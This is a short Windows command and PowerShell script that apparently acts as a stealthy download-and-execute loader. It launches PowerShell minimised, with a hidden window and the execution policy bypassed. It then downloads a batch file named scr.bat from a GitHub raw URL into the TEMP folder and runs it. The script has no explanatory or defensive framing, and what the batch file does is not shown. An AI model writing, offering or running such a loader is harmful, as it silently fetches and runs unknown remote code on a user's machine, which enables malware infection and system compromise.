cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
# URL of the file to download
$url = "https://github.com/KevinDark5/data/raw/refs/heads/main/scr.bat"

# Temporary file path to save the downloaded file
$tempPath = "$env:TEMP\scr.bat"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $tempPath

# Execute the downloaded file
Start-Process -FilePath $tempPath
